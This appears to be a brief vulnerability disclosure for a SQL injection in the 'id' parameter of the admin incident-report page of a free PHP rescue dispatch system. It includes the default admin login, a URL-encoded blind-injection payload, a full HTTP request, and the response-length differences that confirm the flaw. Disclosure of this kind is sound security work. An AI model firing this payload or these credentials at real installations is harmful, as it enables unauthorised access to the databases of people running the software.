# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/incident_reports/manage_report.php?id=

Vulnerability location: /rdms/admin/incident_reports/manage_report.php?id=,id

[+] Payload: /rdms/admin/incident_reports/manage_report.php?id=3%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/incident_reports/manage_report.php?id=3%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 7315
![image](https://user-images.githubusercontent.com/54017627/170455359-2068f45f-9b18-4b01-a08d-add569addcb4.png)

![image](https://user-images.githubusercontent.com/54017627/170455445-f5533522-4f43-450b-9d7c-6eb7af91d667.png)

When length (database ()) = 7, Content-Length: 7726

![image](https://user-images.githubusercontent.com/54017627/170455306-e5cafb44-53c0-4441-af6b-c34a0a4883a7.png)

![image](https://user-images.githubusercontent.com/54017627/170455396-6fe1249a-4dd6-49b0-b614-da372a4b5e68.png)
